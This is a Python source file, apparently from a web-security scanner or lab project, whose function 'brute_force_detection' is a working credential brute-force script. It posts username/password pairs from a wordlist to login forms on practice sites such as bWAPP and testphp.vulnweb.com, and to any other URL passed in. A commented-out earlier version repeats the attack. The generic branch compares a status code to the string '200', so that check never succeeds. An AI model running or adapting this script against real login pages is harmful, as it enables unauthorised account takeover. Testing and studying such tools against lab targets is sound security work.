import re
import requests

from utils import read_file


# def brute_force_detection(URL):
#     uname_pass = read_file("userpass.txt")

#     for up in uname_pass:
#         payload = {
#             "login": up[0],
#             "password": up[1],
#             "security_level": 0,
#             "form": "submit",
#         }
#         print(f">>>>>>>>>>>\tTrying username: {up[0]} and password: {up[1]}")

#         res = requests.post(URL, data=payload)

#         if res.url == "https://bwapp.hakhub.net/portal.php":
#             print(f"\nBrute Force Successfull\nUsername: {up[0]}\tPassword: {up[1]}")
#             return True, up[0], up[1]
#     return False


def brute_force_detection(URL):
    uname_pass = read_file("userpass.txt")

    for up in uname_pass:
        payload = {
            "login": up[0],
            "password": up[1],
            "security_level": 0,
            "form": "submit",
        }
        print(f">>>>>>>>>>>\tTrying username: {up[0]} and password: {up[1]}")

        if re.findall("https://bwapp.hakhub.net", URL):
            res = requests.post(URL, data=payload)

            if res.url == "https://bwapp.hakhub.net/portal.php":
                print(
                    f"\nBrute Force Successfull\nUsername: {up[0]}\tPassword: {up[1]}"
                )
                return True, up[0], up[1]
        elif re.findall("testphp.vulnweb.com", URL):
            res = requests.post(
                "http://testphp.vulnweb.com/userinfo.php",
                {"uname": up[0], "pass": up[1]},
            )

            if res.cookies:
                print(
                    f"\nBrute Force Successfull\nUsername: {up[0]}\tPassword: {up[1]}"
                )
                return True, up[0], up[1]
        else:
            res = requests.post(URL, data=payload)

            if res.status_code == "200":
                print(
                    f"\nBrute Force Successfull\nUsername: {up[0]}\tPassword: {up[1]}"
                )
                return True, up[0], up[1]
    return False
